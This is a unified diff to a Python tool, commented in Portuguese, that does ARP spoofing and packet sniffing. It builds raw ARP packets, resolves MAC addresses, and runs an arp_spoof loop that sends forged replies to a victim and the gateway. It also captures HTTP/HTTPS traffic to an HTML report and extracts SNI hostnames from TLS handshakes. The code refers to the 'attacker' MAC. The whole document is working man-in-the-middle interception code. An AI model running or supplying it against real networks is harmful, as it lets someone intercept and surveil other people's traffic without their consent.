@@ -136,17 +136,16 @@ def log_to_history(file_path, ip):
         history_file.write(f"{timestamp} - IP encontrado: {ip}\n")
         print(f"[+] Registrado no histórico: {ip}")
 
-# Função para criar um pacote ARP
 def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
     """
     Cria um pacote ARP para spoofing.
     """
-    # Ensure MAC addresses are in bytes format
+    # Converter endereços MAC para bytes, se necessário
     if isinstance(target_mac, str):
-        target_mac = bytes.fromhex(target_mac.replace(':', ''))
+        target_mac = bytes.fromhex(target_mac.replace(":", ""))
     if isinstance(sender_mac, str):
-        sender_mac = bytes.fromhex(sender_mac.replace(':', ''))
-    
+        sender_mac = bytes.fromhex(sender_mac.replace(":", ""))
+
     ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP
     arp_header = struct.pack(
         "!HHBBH6s4s6s4s",
@@ -162,15 +161,12 @@ def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
     )
     return ether_header + arp_header
 
-
-# Função para obter o MAC de um endereço IP
 def get_mac(ip, interface):
     """
     Realiza uma resolução ARP para obter o MAC associado a um IP.
     """
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
     sock.bind((interface, 0))
-    mac = None
     for _ in range(5):  # Tenta algumas vezes para garantir
         packet = create_arp_packet(ip, "ff:ff:ff:ff:ff:ff", "0.0.0.0", "00:00:00:00:00:00")
         sock.send(packet)
@@ -178,10 +174,13 @@ def get_mac(ip, interface):
         if response[12:14] == b"\x08\x06":  # Verifica se é ARP
             sender_ip = socket.inet_ntoa(response[28:32])
             if sender_ip == ip:
-                mac = ':'.join('%02x' % b for b in response[22:28])
+                mac = response[22:28]  # Já retorna em bytes
                 break
+    else:
+        raise Exception(f"MAC não encontrado para o IP {ip}")
     sock.close()
     return mac
+
 
 # Função para enviar ARP Spoofing
 def arp_spoof(target_ip, gateway_ip, interface):
@@ -203,49 +202,11 @@ def arp_spoof(target_ip, gateway_ip, interface):
         sock.send(gateway_packet)
         time.sleep(2)
 
-import os
-import socket
-import struct
-import threading
-from queue import Queue
-from datetime import datetime
-import fcntl
-import array
-import ipaddress
-import queue
-import time
-import subprocess
-
-# Função para habilitar o modo promíscuo sem interferir no NetworkManager
-def set_promiscuous_mode(interface):
-    """
-    Ativa o modo promíscuo na interface especificada sem desativar o NetworkManager.
-    """
-    try:
-        # Ativar o modo promíscuo usando o comando `ip`
-        subprocess.run(["sudo", "ip", "link", "set", interface, "promisc", "on"], check=True)
-        print(f"[+] Modo promíscuo ativado na interface {interface}")
-    except Exception as e:
-        print(f"[Erro] Não foi possível ativar o modo promíscuo: {e}")
-
-# Função para desativar o modo promíscuo ao sair
-def unset_promiscuous_mode(interface):
-    """
-    Desativa o modo promíscuo na interface especificada.
-    """
-    try:
-        subprocess.run(["sudo", "ip", "link", "set", interface, "promisc", "off"], check=True)
-        print(f"[+] Modo promíscuo desativado na interface {interface}")
-    except Exception as e:
-        print(f"[Erro] Não foi possível desativar o modo promíscuo: {e}")
-
 # Função para capturar tráfego
 def capture_traffic(interface, output_file):
     """
     Captura pacotes HTTP e HTTPS e salva em um relatório HTML.
     """
-    set_promiscuous_mode(interface)  # Ativar modo promíscuo
-
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     sock.bind((interface, 0))  # Vincula o socket à interface fornecida
     with open(output_file, "w") as f:
@@ -307,10 +268,7 @@ def capture_traffic(interface, output_file):
                                 print(f"[Erro] Não foi possível processar o pacote HTTPS: {e}")
         except KeyboardInterrupt:
             print("\n[INFO] Captura interrompida pelo usuário.")
-        finally:
-            unset_promiscuous_mode(interface)  # Desativar modo promíscuo ao finalizar
         f.write("</ul></body></html>\n")
-
 
 # Função para extrair o Server Name Indication (SNI)
 def extract_sni(tls_data):
@@ -318,25 +276,26 @@ def extract_sni(tls_data):
     Extrai o Server Name Indication (SNI) de um pacote TLS Client Hello.
     """
     try:
-        # Verifica se é um pacote Client Hello
-        if tls_data[0] == 0x16 and tls_data[5] == 0x01:  # Handshake + Client Hello
-            extensions_length = struct.unpack("!H", tls_data[43:45])[0]
-            extensions_start = 45
+        if tls_data[0] == 0x16 and tls_data[5] == 0x01:  # TLS Handshake + Client Hello
+            session_id_length = tls_data[43]
+            cipher_suites_length = struct.unpack("!H", tls_data[44 + session_id_length:46 + session_id_length])[0]
+            extensions_length_start = 46 + session_id_length + cipher_suites_length + 2
+            extensions_length = struct.unpack("!H", tls_data[extensions_length_start:extensions_length_start + 2])[0]
+            extensions_start = extensions_length_start + 2
             extensions_end = extensions_start + extensions_length
-            extensions_data = tls_data[extensions_start:extensions_end]
 
-            # Procura pela extensão SNI (tipo 0x00)
-            index = 0
-            while index < len(extensions_data):
-                extension_type = struct.unpack("!H", extensions_data[index:index + 2])[0]
-                extension_length = struct.unpack("!H", extensions_data[index + 2:index + 4])[0]
-                if extension_type == 0x00:  # SNI encontrado
-                    server_name_length = struct.unpack("!H", extensions_data[index + 7:index + 9])[0]
-                    server_name = extensions_data[index + 9:index + 9 + server_name_length].decode('utf-8')
+            # Iterate over extensions to find SNI
+            i = extensions_start
+            while i < extensions_end:
+                extension_type = struct.unpack("!H", tls_data[i:i + 2])[0]
+                extension_length = struct.unpack("!H", tls_data[i + 2:i + 4])[0]
+                if extension_type == 0x00:  # SNI extension type
+                    server_name_length = struct.unpack("!H", tls_data[i + 9:i + 11])[0]
+                    server_name = tls_data[i + 11:i + 11 + server_name_length].decode()
                     return server_name
-                index += 4 + extension_length
-    except Exception:
-        pass
+                i += 4 + extension_length
+    except Exception as e:
+        print(f"[Erro] Falha ao processar SNI: {e}")
     return None
 
 # Função para obter o MAC do atacante
